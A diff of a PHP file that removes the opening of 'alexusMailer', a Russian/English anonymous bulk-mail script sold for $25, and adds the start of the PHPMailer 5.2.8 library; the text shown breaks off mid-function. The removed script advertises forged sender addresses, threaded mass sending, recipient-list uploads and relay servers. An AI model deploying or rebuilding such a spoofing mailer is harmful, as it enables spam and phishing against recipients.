@@ -1,2101 +1,2332 @@
-<?php $logpass=""; //FORMAT: md5(loginIMAILpassword); ?>
 <?php
-ini_set('display_errors',0);//1
-ini_set('display_startup_errors',0);//1
-error_reporting(0);//-1
-?>
-<?php header('Content-type: text/html; charset=utf-8;'); ?>
-<?php
-#Alexus(240980845) - http://www.a-l-e-x-u-s.ru/
-#CREATED AT 15.12.2011
-#UPD 02.04.2012 v 1.1
-#UPD 10.04.2012 v 1.2
-#UPD 30.05.2012 v 1.3
-#UPD 02.06.2012 v 1.3.1
-#UPD 20.10.2012 v 1.4
-#UPD 16.02.2013 v 1.5
-#UPD 15.04.2013 v 1.5.1
-#UPD 01.06.2013 v 1.6
-#UPD 15.09.2013 v 1.6.5
-#UOD 30.04.2014 v 1.7
-#UPD 11.08.2014 v 1.7.1
-#UPD 02.10.2014 v 1.7.2
-define("VERSION", "1.7");
-$boundary="--".randomstr(10);
-
-$lang="ru";
-if (isset($_COOKIE['translation'])) 
-	$lang=$_COOKIE['translation'];
-if(isset($_POST['PROXY'])) {
-	$proxy_server=parse_url($_POST['PROXY']);
-	define("PROXY",$proxy_server['host'].":".$proxy_server['port']);
+function PHPMailerAutoload($classname)
+{
+    $filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'class.' . strtolower($classname) . '.php';
+    if (is_readable($filename)) {
+        require $filename;
+    }
 }
 
-$translation=array(
-	'ru'=>array(
-		'status-idle'=>'простаиваем',
-		'status-sending'=>'рассылка',
-		'status-pause'=>'пауза',
-		'process-resume'=>'Возобновить',
-		'process-pause'=>'Приостановить',
-		'process-cancel'=>'Отменить',
-		'settings-primary'=>'Основные',
-		'settings-outservers'=>'Внешние сервера',
-		'settings-security'=>'Безопасность',
-		'settings-history-length'=>'Длина истории отправки',
-		'settings-outservers-doc'=>'Подробное описание работы с внешнеми серверами смотрите в <a href="http://mailer.a-l-e-x-u-s.ru/docs/alexusMailer_v1.7.ru.pdf"><span class="label label-warning">документации</span></a>',
-		'settings-outservers-check'=>'<button class="btn" onclick="pingoutservers()">Проверить сервера</button> (недоступные будут автоматически удалены из списка)',
-		'settings-outservers-check-log'=>'Лог проверки:',
-		'settings-security-notwritable'=>' Отсутствует доступ на запись к скрипту! Смена пароля невозможна. <b>Измените права на 666</b> на время смены пароля.',
-		'settings-security-password-changed'=>'Пароль успешно изменен!',
-		'settings-security-password-not-changed'=>'При изменении пароля произошла ошибка, возможно файл скрипта недоступен на запись.',
-		'settings-security-set-password'=>'Установить пароль',
-		'settings-security-remove-password'=>'Удалить пароль',
-		'settings-security-use-proxy'=>'Использовать http прокси',
-		'main'=>'Главная',
-		'help'=>'Помощь',
-		'login'=>'Логин',
-		'password'=>'Пароль',
-		'settings'=>'Настройки',
-		'name'=>'йаПосылалка',
-		'title_service'=>'Сервис анонимной отправки почты с подменой адреса',
-		'description_service'=>'Сервис анонимной отправки электронной почты с подменой адреса и прикреплением файлов йаПосылалка',
-		'keywords_service'=>'Сервис анонимной отправки почты,анонимная отправка почты, анонимная отправка электронных сообшений, анонимная отправка сообшений, анонимное письмо, анонимный e mail ,отправить анонимный e mail,анонимная отправка e mail',
-		'need_auth'=>'Для доступа необходима авторизация.',
-		'wronglogpas'=>'Неправильный логин или пароль.',
-		'sendedto'=>'Отправлено на ',
-		'badcaptcha'=>'Неправильная captcha',
-		'sendlimit'=>'Лимит отправок 1 в час',
-		'sendavailable'=>'Отправка доступна',
-		'sendlessminute'=>'Отправка менее чем через минуту',
-		'sendafter'=>'Отправка через ',
-		'sendafter2'=>' минут',
-		'attachfile'=>'Прикрепление файла',
-		'close'=>'Закрыть',
-		'upload'=>'Загрузить',
-		'uploadlist'=>'Загрузка списка',
-		'uploadtemplate'=>'Загрузка шаблона',
-		'preview'=>'Предпросмотр',
-		'donatedevelopment'=>'Спонсировать разработку',
-		'techsupport'=>'Техническая поддержка',
-		'settings'=>'Настройки',
-		'threadsnum'=>'Количество потоков:',
-		'timeoutlen'=>'Длительность задржки в секундах:',
-		'useoutservers'=>'Использовать внешние серверы для отправки',
-		'unavalable_in_service'=>'недоступно в режиме сервиса',
-		'less'=>'Меньше',
-		'more'=>'Больше',
-		'delete'=>'Удалить',
-		'status'=>'Статус',
-		'recipient'=>'Кому',
-		'fromname'=>'От кого, имя',
-		'frommail'=>'От кого, адрес email',
-		'replymail'=>'Адрес ответа, email',
-		'subject'=>'Тема',
-		'subject_example'=>'выращивание бамбука под кроватью',
-		'addfield'=>'Дополнительное поле',
-		'addfield2'=>'доп. поле',
-		'mailtype'=>'Тип письма',
-		'plaintext'=>'обычный текст',
-		'withformating'=>'с форматированием',
-		'htmle'=>'html с переносом картинок в аттач',
-		'captcha'=>'Проверочный код',
-		'save'=>'Сохранить',
-		'load'=>'Загрузить',
-		'send'=>'Отправить',
-		'backtoeditor'=>'Вернуться к редактированию',
-		'hellopage'=>'<center><h2>Сервис йаПосылалка</h2></center>
-				<p>
-					
-					Сервис йаПосылалка создан на базе одноименного скрипта анонимной отправки электронной почты. 
-					Для сервиса всегда используется последняя версия скрипта, но при этом сервис имеет некоторые ограничения 
-					для защиты его от использования в качестве спамера.
-					<br><b>Ограничения:</b><br>
-					<ol>
-						<li>Разрешено отправлять одно письмо в час</li>
-						<li>Для отправки необходимо вводить капчу</li>
-						<li>Отображается реклама</li>
-					</ol>
-					<b>Сервис анонимной отправки почты абсолютно бесплатен</b> и существует в первую очедь в демонстрационных целях.<br>
-					<center><button class="btn btn-primary btn-large prime-button">Отправить письмо</button></center>					
-				</p>
-				<p>
-					Последнюю версию скрипта анонимной отправки для установки на своём сервере можно <b>купить за 25$ или 750 рублей</b>.
-					<br>В ней <b>отсутствуют все ограничения</b> на отправку, и обеспечиваются:<br>
-					<ol>
-						<li>Помощь по использованию и установке</li>
-						<li>Исправление найденых ошибок</li>
-						<li>Приоритетный приём заявок по доработке</li>
-						<li>Обновления в пределах текущей ветки</li>
-					</ol>
-					<center><a href="/buy/" class="btn btn-primary btn-large prime-button" style="color:#fff;font-weight:bold;">Купить</a></center>
-				</p>
-				<p>
-					У йаПосылалка существует <b>высокодоходная партнёрская программа</b>, если человек купит скрипт по вашей партнёрской ссылке,
-					вы получаете <b>50% от стоимости</b> скрипта (12.5$ или 325 рублей) с каждой продажи.<br>
-					<center><a href="/partner/" class="btn btn-primary btn-large prime-button" style="color:#fff;font-weight:bold;">Стать партнёром!</a></center>
-				</p>
-
-				<script type="text/javascript">(function() {
-		          if (window.pluso)if (typeof window.pluso.start == "function") return;
-		          var d = document, s = d.createElement(\'script\'), g = \'getElementsByTagName\';
-		          s.type = \'text/javascript\'; s.charset=\'UTF-8\'; s.async = true;
-		          s.src = (\'https:\' == window.location.protocol ? \'https\' : \'http\')  + \'://share.pluso.ru/pluso-like.js\';
-		          var h=d[g](\'head\')[0] || d[g](\'body\')[0];
-		          h.appendChild(s);
-		          })();</script>
-		        <div data-description="Сервис анонимной отправки электронной почты с подменой адреса и прикреплением файлов йаПосылалка" data-title="Сервис анонимной отправки почты с подменой адреса - йаПосылалка" data-url="http://mailer.a-l-e-x-u-s.ru/" class="pluso" data-options="big,square,line,horizontal,counter,theme=08" data-services="vkontakte,odnoklassniki,facebook,twitter,google,moimir,email,print" data-background="#ebebeb"></div>
-				
-				<div id="vk_comments"></div>
-				<script type="text/javascript">
-				VK.Widgets.Comments("vk_comments", {limit: 10, width: "660", attach: false, norealtime:1}, "mailer.a-l-e-x-u-s.ru");
-				</script>',
-		'helppage'=>'<h2>Справка</h2>
-				<h3>Что это?</h3>
-				Сервис анонимной отправки email сообщений с произвольного/чужого адреса в текстовом или html формате.<br>
-				<b>Формат html(e)</b> позволяет автоматически перенести в attach картинки из тегов img или атрибута background, что делает письмо автономным и не требует внешнего сервера для корректного отображения. 
-				Так же в почтовых клиентах (the bat, outlook, ...) картинки отображаются сразу.<br>
-				<b>esreveR</b> меняет символы в обратном порядке и устанавливает css для их отображения в верном порядке.<br>
-				<b>Предпросмотр</b> позволяет посмотреть как будет выглядеть письмо когда все макросы будут заменены.<br>
-				<b>Сохранение\Загрука</b> позволяет экономить время и делать шаблоны для часто используемых писем.<br>
-				<b>Подгрузка списка</b> адресатов возможна нажатием на кнопку рядом с соотв. полем.<br>
-				<b>Задержка</b> между отправкой писем<br>
-				<b>Внешние серверы</b> для распределения рассылки между разными йаПосылалками <br><b style="color:red;">Перед использованием внешних посылалок проверьте корректность их работы на сервере</b>
-				<br><br><a href="http://mailer.a-l-e-x-u-s.ru/docs/alexusMailer_v1.7.ru.pdf"><span class="label label-warning"><i class="icon-file icon-white"></i> Скачать полную документацию</span></a>
-				<hr>
-				<h3>Макросы (в теле письма и в заголовках)</h3>
-				<ul>
-					<li>Кому - <b>[TO-EMAIL]</b></li>
-					<li>От кого, имя - <b>[FROM-NAME]</b></li>
-					<li>От кого, адрес email - <b>[FROM-EMAIL]</b></li>
-					<li>Тема - <b>[THEME]</b></li>
-					<li>Дополнительное поле - <b>[ADD0]</b> , <b>[ADD1]</b>, <b>[ADD2]</b> ...</li>
-					<li>Случайное число (5000..6000)- <b>[RAND]</b></li>
-					<li>Случайное число (от A до B)- <b>[RAND-A-B]</b> , например <b>[RAND-10-99]</b></li>
-					<li>Случайный текст - <b>[RAND:text1|text2|...]</b> , например <b>[RAND:hello dude|hello|hi|wazzup]</b></li>
-					<li>Перечисление - <b>[ENUM:text1|text2|...]</b> , например <b>[ENUM:здравствуйте|привет|как дела]</b></li>
-				 </ul>
-				 <h3>Макросы даты и времени</h3>
-				 <ul>
-				 	<li><b>[DATE]</b> - Текущая дата (<b>[DATE-4]</b> - Текущая дата минус 4 дня) (<b>[DATE+4]</b> - Текущая дата плюс 4 дня)
-				 		<ul>
-				 			<li><b>[DAY]</b> - Текущий день (<b>[DAY+3]</b> - Текущий день плюс 3 дня)</li>
-				 			<li><b>[MONTH]</b> - Текущий месяц (<b>[MONTH-2]</b> - Текущий месяц минус 2 месяца)</li>
-				 			<li><b>[YEAR]</b> - Текущий год (<b>[YEAR-1]</b> - Текущий год минус 1 год)</li>
-				 		</ul>
-				 	</li>
-				 	<li><b>[TIME]</b> - Текущее время (<b>[TIME-4]</b> - Текущее время минус 4 минуты)
-				 		<ul>
-				 			<li><b>[HOUR]</b> - Текущий час (<b>[HOUR-3]</b> - Текущий час минус 3 часа)</li>
-				 			<li><b>[MINUTE]</b> - Текущий месяц (<b>[MINUTE-2]</b> - Текущая минута минус 2 минуты)</li>
-				 		</ul>
-				 	</li>
-				 </ul>
-				<hr>
-				Внимание! Сервис предоставлен исключительно для ознакомления. Ответственность за возможно незаконное использование несете только Вы.'
-	),
-	'en'=>array(
-		'status-idle'=>'Idle',
-		'status-sending'=>'Sending',
-		'status-pause'=>'Pause',
-		'process-resume'=>'Resume',
-		'process-pause'=>'Pause',
-		'process-cancel'=>'Cancel',
-		'settings-primary'=>'Primary',
-		'settings-outservers'=>'External servers',
-		'settings-security'=>'Security',
-		'settings-history-length'=>'History max length',
-		'settings-outservers-doc'=>'Read <a href="http://mailer.a-l-e-x-u-s.ru/docs/alexusMailer_v1.7.en.pdf"><span class="label label-warning">documentation</span></a> to learn more about external servers.',
-		'settings-outservers-check'=>'<button class="btn" onclick="pingoutservers()">Check servers</button> (Unavailable will be auto-removed)',
-		'settings-outservers-check-log'=>'Check log:',
-		'settings-security-notwritable'=>'Script file is not writable! Password change imposible. <b>Change file rights to 666</b> for password change.',
-		'settings-security-password-changed'=>'Password succesfully changed!',
-		'settings-security-password-not-changed'=>'There was an error during pass change, may be script file is not writable.',
-		'settings-security-set-password'=>'Set password',
-		'settings-security-remove-password'=>'Remove password',
-		'settings-security-use-proxy'=>'Use http proxy',
-		'main'=>'Primary',
-		'help'=>'Help',
-		'login'=>'Login',
-		'password'=>'Password',
-		'settings'=>'Settings',
-		'backtoeditor'=>'Back to editor',
-		'name'=>'alexusMailer',
-		'title_service'=>'Anonymous e-mail service',
-		'description_service'=>'Сервис анонимной отправки электронной почты с подменой адреса и прикреплением файлов йаПосылалка',
-		'keywords_service'=>'Сервис анонимной отправки почты,анонимная отправка почты, анонимная отправка электронных сообшений, анонимная отправка сообшений, анонимное письмо, анонимный e mail ,отправить анонимный e mail,анонимная отправка e mail',
-		'need_auth'=>'Authentification required!',
-		'wronglogpas'=>'Wrong login or password!',
-		'sendedto'=>'Sended to ',
-		'badcaptcha'=>'Wrong security code',
-		'sendlimit'=>'Sending limit is 1 per hour',
-		'sendavailable'=>'Sending available',
-		'sendlessminute'=>'Sending will be available less in one minute',
-		'sendafter'=>'Sending after ',
-		'sendafter2'=>' minutes',
-		'attachfile'=>'Attach file',
-		'close'=>'Close',
-		'upload'=>'Upload',
-		'uploadlist'=>'Upload list',
-		'uploadtemplate'=>'Upload template',
-		'preview'=>'Preview',
-		'donatedevelopment'=>'Donate to developer',
-		'techsupport'=>'Tech Support',
-		'settings'=>'Settings',
-		'threadsnum'=>'Thread nubmer:',
-		'timeoutlen'=>'Timeout in seconds:',
-		'useoutservers'=>'Use external servers for sending',
-		'unavalable_in_service'=>'unavailable in service mode',
-		'less'=>'Less',
-		'more'=>'More',
-		'delete'=>'Delete',
-		'status'=>'Status',
-		'recipient'=>'Recipient',
-		'fromname'=>'From, name',
-		'frommail'=>'From, email',
-		'replymail'=>'Reply-to, email',
-		'subject'=>'Subject',
-		'subject_example'=>'Growing bamboo under the bed',
-		'addfield'=>'Additional field',
-		'addfield2'=>'add. field',
-		'mailtype'=>'Mail type',
-		'plaintext'=>'plain text',
-		'withformating'=>'with formating',
-		'htmle'=>'html with image auto-attach',
-		'captcha'=>'Security code',
-		'save'=>'Save',
-		'load'=>'Load',
-		'send'=>'Send',
-		'hellopage'=>'<center><h2>alexusMailer service</h2></center>
-				<p>
-					alexusMailer service is based on the eponymous script to send an anonymous e-mail.
-					For this service is always used the latest version of the alexusMailer, but it have some limitations to protect it from being used as a spammer.
-					<br><b>Limitations:</b><br>
-					<ol>
-						<li>Allowed to send one letter per hour</li>
-						<li>To send you must enter the captcha</li>
-						<li>Advertisement</li>
-					</ol>
-					<b>Anonymous mailing service is completely free</b> and exists in demonstration purposes.<br>
-					<center><button class="btn btn-primary btn-large prime-button">Send mail</button></center>					
-				</p>
-				<p>
-					You can by the latest version of alexusMailer - anonymous mailing script for installing on your own server <b>for 25 USD</b>.
-					<br>This version <b>have no any limitations</b> and gives you:<br>
-					<ol>
-						<li>Full support in installation and using</li>
-						<li>Fixing of all errors you can find</li>
-						<li>Priority accepting applications for upgrading</li>
-						<li>Free updates in current major version (1.*)</li>
-					</ol>
-					<center><a href="/en/buy/" class="btn btn-primary btn-large prime-button" style="color:#fff;font-weight:bold;">Buy alexusMailer</a></center>
-				</p>
-				<p>
-					alexusMailer has a <b>highly profitable partnership program</b>, if a person buys alexusMailer on your affiliate link
-					you get <b>50% of the cost</b> (12.5 USD) per sale.<br>
-					<center><a href="/en/partner/" class="btn btn-primary btn-large prime-button" style="color:#fff;font-weight:bold;">Became a partner!</a></center>
-				</p>
-
-				<script type="text/javascript">(function() {
-		          if (window.pluso)if (typeof window.pluso.start == "function") return;
-		          var d = document, s = d.createElement(\'script\'), g = \'getElementsByTagName\';
-		          s.type = \'text/javascript\'; s.charset=\'UTF-8\'; s.async = true;
-		          s.src = (\'https:\' == window.location.protocol ? \'https\' : \'http\')  + \'://share.pluso.ru/pluso-like.js\';
-		          var h=d[g](\'head\')[0] || d[g](\'body\')[0];
-		          h.appendChild(s);
-		          })();</script>
-		        <div data-description="Anonymous e-mail service with attaching files - alexusMailer" data-title="Anonymous remailer - alexusMailer" data-url="http://mailer.a-l-e-x-u-s.ru/en/" class="pluso" data-options="big,square,line,horizontal,counter,theme=08" data-services="vkontakte,odnoklassniki,facebook,twitter,google,moimir,email,print" data-background="#ebebeb"></div>
-				',
-		'helppage'=>'<h2>Help</h2>
-				<h3>What is it?</h3>
-				Anonymous mailing service from random or foreign email in plain text or html format.<br>
-				<b>Format html(e)</b> allows automatically move images from img tag or background attribute to attach, what makes letter independent from external server for correct display. 
-				Also in e-mail clients (the bat, outlook, ...) will be displayed immediately.<br>
-				<b>esreveR</b> change symbol possition in back order and set css for correct display in mail.<br>
-				<b>Preview</b> can hepl to see how mail will look after all macro will be replaced.<br>
-				<b>Save\Load</b> is helpful in making collection of regular mailing templates.<br>
-				<b>Recipient list loading</b> available by clicking on button near the recipient field.<br>
-				<b>Timeout</b> between sending mails.<br>
-				<b>External servers</b> for distributing you mails between different servers <br><b style="color:red;">Before using external servers ensure that they work correct.</b>
-				<br><br><a href="http://mailer.a-l-e-x-u-s.ru/docs/alexusMailer_v1.7.en.pdf"><span class="label label-warning"><i class="icon-file icon-white"></i> Download full documentation</span></a>
-				<hr>
-				<h3>Macro (in mail body, headers and additional fields)</h3>
-				<ul>
-					<li>Recipient - <b>[TO-EMAIL]</b></li>
-					<li>From, name - <b>[FROM-NAME]</b></li>
-					<li>From, email - <b>[FROM-EMAIL]</b></li>
-					<li>Subject - <b>[THEME]</b></li>
-					<li>Additional field - <b>[ADD0]</b> , <b>[ADD1]</b>, <b>[ADD2]</b> ...</li>
-					<li>Random number (5000..6000)- <b>[RAND]</b></li>
-					<li>Random number (from A to B)- <b>[RAND-A-B]</b> , example <b>[RAND-10-99]</b></li>
-					<li>Random text - <b>[RAND:text1|text2|...]</b> , example <b>[RAND:hello dude|hello|hi|wazzup]</b></li>
-					<li>Enumeration - <b>[ENUM:text1|text2|...]</b> , example <b>[ENUM:wellcome|hi|how are you]</b></li>
-				 </ul>
-				 <h3>Macro for date and time</h3>
-				 <ul>
-				 	<li><b>[DATE]</b> - Current date (<b>[DATE-4]</b> - Current date minus 4 days) (<b>[DATE+4]</b> - Current date plus 4 days)
-				 		<ul>
-				 			<li><b>[DAY]</b> - Current day (<b>[DAY+3]</b> - Current day plus 3 days)</li>
-				 			<li><b>[MONTH]</b> - Current month (<b>[MONTH-2]</b> - Current month minus 2 months)</li>
-				 			<li><b>[YEAR]</b> - Current year (<b>[YEAR-1]</b> - Current year minus 1 year)</li>
-				 		</ul>
-				 	</li>
-				 	<li><b>[TIME]</b> - Current time (<b>[TIME-4]</b> - Current time minus 4 minutes)
-				 		<ul>
-				 			<li><b>[HOUR]</b> - Current hour (<b>[HOUR-3]</b> - Current hour minus 3 hours)</li>
-				 			<li><b>[MINUTE]</b> - Current minute (<b>[MINUTE-2]</b> - Current minute minus 2 minutes)</li>
-				 		</ul>
-				 	</li>
-				 </ul>
-				<hr>
-				Warning! This service was created only in demonstration purposes. All responsibility for out law actions is only on you!'
-	)	
-);
-function tr($name, $iface=true) {
-	global $lang, $translation;
-	if($iface)
-		print "<span class='tr-$name'>".$translation[$lang][$name]."</span>";
-	else
-		print $translation[$lang][$name];
-	return;
-}
-
-if($logpass!="") {
-	if(!isset($_SERVER['PHP_AUTH_USER'])) {
-		header('WWW-Authenticate: Basic realm="IMAIL"');
-	    header('HTTP/1.0 401 Unauthorized');
-	    print tr('need_auth',false);
-	    exit;
-	} else {
-		if(md5($_SERVER['PHP_AUTH_USER']."IMAIL".$_SERVER['PHP_AUTH_PW'])!=$logpass) {
-			header('WWW-Authenticate: Basic realm="IMAIL"');
-	    	header('HTTP/1.0 401 Unauthorized');
-			print tr('wronglogpas',false);
-			exit;
-		}
-	}
-}
-
-if (get_magic_quotes_gpc()) {
-    function stripslashes_deep($value)
+if (version_compare(PHP_VERSION, '5.1.2', '>=')) {
+    if (version_compare(PHP_VERSION, '5.3.0', '>=')) {
+        spl_autoload_register('PHPMailerAutoload', true, true);
+    } else {
+        spl_autoload_register('PHPMailerAutoload');
+    }
+} else {
+    function __autoload($classname)
     {
-        $value = is_array($value) ?
-                    array_map('stripslashes_deep', $value) :
-                    stripslashes($value);
+        PHPMailerAutoload($classname);
+    }
+}
+?>
+<?php
 
-        return $value;
+class PHPMailer
+{
+    const STOP_MESSAGE = 0;
+    const STOP_CONTINUE = 1;
+    const STOP_CRITICAL = 2;
+    const CRLF = "\r\n";
+    public $Version = '5.2.8';
+    public $Priority = 3;
+    public $CharSet = 'iso-8859-1';
+    public $ContentType = 'text/plain';
+    public $Encoding = '8bit';
+    public $ErrorInfo = '';
+    public $From = 'root@localhost';
+    public $FromName = 'Root User';
+    public $Sender = '';
+    public $ReturnPath = '';
+    public $Subject = '';
+    public $Body = '';
+    public $AltBody = '';
+    public $Ical = '';
+    public $WordWrap = 0;
+    public $Mailer = 'mail';
+    public $Sendmail = '/usr/sbin/sendmail';
+    public $UseSendmailOptions = true;
+    public $PluginDir = '';
+    public $ConfirmReadingTo = '';
+    public $Hostname = '';
+    public $MessageID = '';
+    public $MessageDate = '';
+    public $Host = 'localhost';
+    public $Port = 25;
+    public $Helo = '';
+    public $SMTPSecure = '';
+    public $SMTPAuth = false;
+    public $Username = '';
+    public $Password = '';
+    public $AuthType = '';
+    public $Realm = '';
+    public $Workstation = '';
+    public $Timeout = 10;
+    public $SMTPDebug = 0;
+    public $Debugoutput = 'echo';
+    public $SMTPKeepAlive = false;
+    public $SingleTo = false;
+    public $SingleToArray = array();
+    public $do_verp = false;
+    public $AllowEmpty = false;
+    public $LE = "\n";
+    public $DKIM_selector = '';
+    public $DKIM_identity = '';
+    public $DKIM_passphrase = '';
+    public $DKIM_domain = '';
+    public $DKIM_private = '';
+    public $action_function = '';
+    public $XMailer = '';
+    protected $MIMEBody = '';
+    protected $MIMEHeader = '';
+    protected $mailHeader = '';
+    protected $smtp = null;
+    protected $to = array();
+    protected $cc = array();
+    protected $bcc = array();
+    protected $ReplyTo = array();
+    protected $all_recipients = array();
+    protected $attachment = array();
+    protected $CustomHeader = array();
+    protected $lastMessageID = '';
+    protected $message_type = '';
+    protected $boundary = array();
+    protected $language = array();
+    protected $error_count = 0;
+    protected $sign_cert_file = '';
+    protected $sign_key_file = '';
+    protected $sign_key_pass = '';
+    protected $exceptions = false;
+
+    public function __construct($exceptions = false)
+    {
+        $this->exceptions = ($exceptions == true);
+        if (version_compare(PHP_VERSION, '5.1.2', '>=')) {
+            $autoload = spl_autoload_functions();
+            if ($autoload === false or !in_array('PHPMailerAutoload', $autoload)) {
+
+            }
+        }
     }
 
-    $_POST = array_map('stripslashes_deep', $_POST);
-    $_GET = array_map('stripslashes_deep', $_GET);
-    $_COOKIE = array_map('stripslashes_deep', $_COOKIE);
-    $_REQUEST = array_map('stripslashes_deep', $_REQUEST);
+    public function __destruct()
+    {
+        if ($this->Mailer == 'smtp') {
+            $this->smtpClose();
+        }
+    }
+
+    public function smtpClose()
+    {
+        if ($this->smtp !== null) {
+            if ($this->smtp->connected()) {
+                $this->smtp->quit();
+                $this->smtp->close();
+            }
+        }
+    }
+
+    public function isSMTP()
+    {
+        $this->Mailer = 'smtp';
+    }
+
+    public function isMail()
+    {
+        $this->Mailer = 'mail';
+    }
+
+    public function isSendmail()
+    {
+        $ini_sendmail_path = ini_get('sendmail_path');
+        if (!stristr($ini_sendmail_path, 'sendmail')) {
+            $this->Sendmail = '/usr/sbin/sendmail';
+        } else {
+            $this->Sendmail = $ini_sendmail_path;
+        }
+        $this->Mailer = 'sendmail';
+    }
+
+    public function isQmail()
+    {
+        $ini_sendmail_path = ini_get('sendmail_path');
+        if (!stristr($ini_sendmail_path, 'qmail')) {
+            $this->Sendmail = '/var/qmail/bin/qmail-inject';
+        } else {
+            $this->Sendmail = $ini_sendmail_path;
+        }
+        $this->Mailer = 'qmail';
+    }
+
+    public function addAddress($address, $name = '')
+    {
+        return $this->addAnAddress('to', $address, $name);
+    }
+
+    protected function addAnAddress($kind, $address, $name = '')
+    {
+        if (!preg_match('/^(to|cc|bcc|Reply-To)$/', $kind)) {
+            $this->setError($this->lang('Invalid recipient array') . ': ' . $kind);
+            $this->edebug($this->lang('Invalid recipient array') . ': ' . $kind);
+            if ($this->exceptions) {
+                throw new phpmailerException('Invalid recipient array: ' . $kind);
+            }
+            return false;
+        }
+        $address = trim($address);
+        $name = trim(preg_replace('/[\r\n]+/', '', $name));
+        if (!$this->validateAddress($address)) {
+            $this->setError($this->lang('invalid_address') . ': ' . $address);
+            $this->edebug($this->lang('invalid_address') . ': ' . $address);
+            if ($this->exceptions) {
+                throw new phpmailerException($this->lang('invalid_address') . ': ' . $address);
+            }
+            return false;
+        }
+        if ($kind != 'Reply-To') {
+            if (!isset($this->all_recipients[strtolower($address)])) {
+                array_push($this->$kind, array($address, $name));
+                $this->all_recipients[strtolower($address)] = true;
+                return true;
+            }
+        } else {
+            if (!array_key_exists(strtolower($address), $this->ReplyTo)) {
+                $this->ReplyTo[strtolower($address)] = array($address, $name);
+                return true;
+            }
+        }
+        return false;
+    }
+
+    protected function setError($msg)
+    {
+        $this->error_count++;
+        if ($this->Mailer == 'smtp' and !is_null($this->smtp)) {
+            $lasterror = $this->smtp->getError();
+            if (!empty($lasterror) and array_key_exists('smtp_msg', $lasterror)) {
+                $msg .= '<p>' . $this->lang('smtp_error') . $lasterror['smtp_msg'] . "</p>\n";
+            }
+        }
+        $this->ErrorInfo = $msg;
+    }
+
+    protected function lang($key)
+    {
+        if (count($this->language) < 1) {
+            $this->setLanguage('en');
+        }
+        if (isset($this->language[$key])) {
+            return $this->language[$key];
+        } else {
+            return 'Language string failed to load: ' . $key;
+        }
+    }
+
+    public function setLanguage($langcode = 'en', $lang_path = '')
+    {
+        $PHPMAILER_LANG = array('authenticate' => 'SMTP Error: Could not authenticate.', 'connect_host' => 'SMTP Error: Could not connect to SMTP host.', 'data_not_accepted' => 'SMTP Error: data not accepted.', 'empty_message' => 'Message body empty', 'encoding' => 'Unknown encoding: ', 'execute' => 'Could not execute: ', 'file_access' => 'Could not access file: ', 'file_open' => 'File Error: Could not open file: ', 'from_failed' => 'The following From address failed: ', 'instantiate' => 'Could not instantiate mail function.', 'invalid_address' => 'Invalid address', 'mailer_not_supported' => ' mailer is not supported.', 'provide_address' => 'You must provide at least one recipient email address.', 'recipients_failed' => 'SMTP Error: The following recipients failed: ', 'signing' => 'Signing Error: ', 'smtp_connect_failed' => 'SMTP connect() failed.', 'smtp_error' => 'SMTP server error: ', 'variable_set' => 'Cannot set or reset variable: ');
+        if (empty($lang_path)) {
+            $lang_path = dirname(__FILE__) . DIRECTORY_SEPARATOR . 'language' . DIRECTORY_SEPARATOR;
+        }
+        $foundlang = true;
+        $lang_file = $lang_path . 'phpmailer.lang-' . $langcode . '.php';
+        if ($langcode != 'en') {
+            if (!is_readable($lang_file)) {
+                $foundlang = false;
+            } else {
+                $foundlang = include $lang_file;
+            }
+        }
+        $this->language = $PHPMAILER_LANG;
+        return ($foundlang == true);
+    }
+
+    protected function edebug($str)
+    {
+        if (!$this->SMTPDebug) {
+            return;
+        }
+        switch ($this->Debugoutput) {
+            case  'error_log':
+                error_log($str);
+                break;
+            case  'html':
+                echo htmlentities(preg_replace('/[\r\n]+/', '', $str), ENT_QUOTES, $this->CharSet) . "<br>\n";
+                break;
+            case  'echo':
+            default:
+                echo $str . "\n";
+        }
+    }
+
+    public static function validateAddress($address, $patternselect = 'auto')
+    {
+        if (!$patternselect or $patternselect == 'auto') {
+            if (defined('PCRE_VERSION')) {
+                if (version_compare(PCRE_VERSION, '8.0') >= 0) {
+                    $patternselect = 'pcre8';
+                } else {
+                    $patternselect = 'pcre';
+                }
+            } else {
+                if (version_compare(PHP_VERSION, '5.2.0') >= 0) {
+                    $patternselect = 'php';
+                } else {
+                    $patternselect = 'noregex';
+                }
+            }
+        }
+        switch ($patternselect) {
+            case  'pcre8':
+                return (boolean)preg_match('/^(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){255,})(?!(?>(?1)"?(?>\\\[ -~]|[^"])"?(?1)){65,}@)' . '((?>(?>(?>((?>(?>(?>\x0D\x0A)?[\t ])+|(?>[\t ]*\x0D\x0A)?[\t ]+)?)(\((?>(?2)' . '(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)' . '([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*' . '(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)' . '(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}' . '|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:' . '|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}' . '|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD', $address);
+            case  'pcre':
